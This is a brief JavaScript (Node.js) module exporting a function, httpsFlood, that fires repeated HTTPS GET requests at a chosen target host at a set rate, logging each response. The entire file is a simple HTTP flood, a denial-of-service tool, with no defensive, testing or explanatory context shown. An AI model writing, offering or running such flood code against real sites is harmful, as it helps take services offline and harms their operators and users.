const https = require('https');

function httpsFlood(target, rateLimit) {
    setInterval(() => {
        const req = https.request({
            hostname: target,
            port: 443,
            path: '/',
            method: 'GET'
        }, (res) => {
            res.on('data', (chunk) => {
                console.log('Received: ' + chunk);
            });
        });

        req.on('error', (err) => {
            console.error('Error: ' + err.message);
        });

        req.end();
    }, 1000 / rateLimit);
}

module.exports = httpsFlood;
